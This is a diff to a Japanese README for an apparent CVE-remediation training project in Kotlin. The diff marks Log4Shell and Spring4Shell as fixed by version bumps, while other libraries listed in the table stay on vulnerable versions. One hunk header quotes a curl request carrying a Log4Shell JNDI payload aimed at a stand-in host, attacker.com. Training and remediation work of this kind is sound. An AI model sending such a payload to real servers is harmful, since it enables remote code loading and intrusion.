@@ -9,8 +9,8 @@ CVE解消トレーニング用のサーバーサイド Kotlin プロジェクト
 
 | CVE | CVSS | ライブラリ / バージョン | 種別 | 修正バージョン |
 |-----|------|------------------------|------|--------------|
-| CVE-2021-44228 | **10.0** Critical | log4j-core 2.14.1 | RCE (Log4Shell) | 2.15.0+ |
-| CVE-2022-22965 | **9.8** Critical | spring-webmvc 5.3.15 | RCE (Spring4Shell) | 5.3.18+ |
+| CVE-2021-44228 | **10.0** Critical | log4j-core 2.17.2 | RCE (Log4Shell) | 修正済み |
+| CVE-2022-22965 | **9.8** Critical | spring-webmvc 5.3.19 | RCE (Spring4Shell) | 修正済み |
 | CVE-2022-1471  | **9.8** Critical | snakeyaml 1.30 | RCE (デシリアライズ) | 2.0+ |
 | CVE-2022-45868 | **9.8** Critical | h2 2.1.210 | RCE (コンソール) | 2.1.214+ |
 | CVE-2022-42889 | **9.8** Critical | commons-text 1.9 | RCE (Text4Shell) | 1.10.0+ |
@@ -35,8 +35,10 @@ curl "http://localhost:8080/api/search?query=\${jndi:ldap://attacker.com/exploit
 ```
 
 **修正方法:**
-- `build.gradle.kts` の `extra["log4j2.version"]` を `"2.17.1"` に変更
+- `build.gradle.kts` の `extra["log4j2.version"]` を `"2.17.2"` に変更
 - または JVM フラグ `-Dlog4j2.formatMsgNoLookups=true` を追加
+
+**このブランチでの対応:** `log4j2.version` を `2.17.2` に更新済み。
 
 ---
 
@@ -50,7 +52,9 @@ JDK 9+ かつ WAR デプロイ または Spring WebMVC 利用で発動。
 
 **修正方法:**
 - `build.gradle.kts` の Spring Boot バージョンを `"2.6.7"` 以上に変更
-  (Spring Framework 5.3.18 が同梱される)
+  (Spring Boot 2.6.7 では Spring Framework 5.3.19 が同梱される)
+
+**このブランチでの対応:** Spring Boot を `2.6.7` に更新し、Spring Framework `5.3.19` を取り込む。
 
 ---
 
